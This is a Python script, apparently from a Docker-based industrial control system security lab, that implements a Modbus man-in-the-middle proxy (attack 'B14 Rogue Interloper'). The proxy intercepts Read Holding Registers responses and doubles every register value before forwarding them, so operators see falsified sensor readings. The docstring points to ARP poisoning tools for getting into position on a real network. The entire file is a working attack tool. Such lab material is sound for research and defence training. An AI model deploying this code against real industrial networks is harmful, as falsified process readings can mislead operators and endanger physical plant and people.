"""
B14 - Rogue Interloper (Man-in-the-Middle)
A transparent TCP proxy positioned between master and slave.
It intercepts every Modbus FC03 (Read Holding Registers) response and
doubles all register values before forwarding to the master, so the
operator sees falsified sensor readings without any indication of tampering.

In a real deployment, the attacker would reach this position via:
  - ARP cache poisoning (arpspoof / ettercap)
  - Physical insertion of a device on the communication link

In this Docker simulation the master is directed to connect to the proxy
IP (172.20.0.4) instead of the slave (172.20.0.2).

Usage:
  # Terminal 1 — start proxy
  docker exec modbus-attacker python modification_mitm.py

  # Terminal 2 — start a test master pointed at the proxy
  docker exec modbus-attacker python -c "
import os, asyncio
os.environ['SLAVE_IP'] = '172.20.0.4'
exec(open('/app/test_master.py').read())
"

Reference: Huitsing et al. (2008), attack B14  (15 instances — most impactful)
Threat type: Modification (also Interception and Fabrication)
Target assets: Master, Field device, Network path, Message
"""

import asyncio
import struct

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 502
REAL_SLAVE_HOST = "172.20.0.2"
REAL_SLAVE_PORT = 502


def tamper_fc03_response(data: bytes) -> bytes:
    """Double every register value in an FC03 (Read Holding Registers) response."""
    if len(data) < 9:
        return data

    fc = data[7]
    if fc != 3:
        return data

    byte_count = data[8]
    if len(data) < 9 + byte_count:
        return data

    modified = bytearray(data)
    reg_count = byte_count // 2

    originals, tampered = [], []
    for i in range(reg_count):
        offset = 9 + i * 2
        original = struct.unpack(">H", data[offset: offset + 2])[0]
        new_val = min(original * 2, 0xFFFF)
        struct.pack_into(">H", modified, offset, new_val)
        originals.append(original)
        tampered.append(new_val)

    print(f"[B14] FC03 response intercepted — "
          f"original={originals}  →  sent_to_master={tampered}")
    return bytes(modified)


async def relay(reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
                direction: str, transform=None) -> None:
    try:
        while True:
            chunk = await reader.read(4096)
            if not chunk:
                break
            if transform:
                chunk = transform(chunk)
            writer.write(chunk)
            await writer.drain()
    except (asyncio.IncompleteReadError, ConnectionResetError):
        pass
    finally:
        try:
            writer.close()
        except Exception:
            pass


async def handle_master(master_r: asyncio.StreamReader,
                         master_w: asyncio.StreamWriter) -> None:
    peer = master_w.get_extra_info("peername")
    print(f"[B14] Master connected from {peer}")

    slave_r, slave_w = await asyncio.open_connection(REAL_SLAVE_HOST, REAL_SLAVE_PORT)
    print(f"[B14] Proxy connected to real slave {REAL_SLAVE_HOST}:{REAL_SLAVE_PORT}")

    await asyncio.gather(
        relay(master_r, slave_w, "→ slave"),                     # requests: pass through unchanged
        relay(slave_r, master_w, "← master", tamper_fc03_response),  # responses: tamper values
        return_exceptions=True,
    )
    print(f"[B14] Session with {peer} closed.")


async def main() -> None:
    server = await asyncio.start_server(handle_master, LISTEN_HOST, LISTEN_PORT)
    addrs = [s.getsockname() for s in server.sockets]
    print(f"[B14] Rogue Interloper proxy listening on {addrs}")
    print(f"[B14] Forwarding to real slave at {REAL_SLAVE_HOST}:{REAL_SLAVE_PORT}")
    print("[B14] FC03 responses will have ALL register values DOUBLED\n")
    async with server:
        await server.serve_forever()


asyncio.run(main())
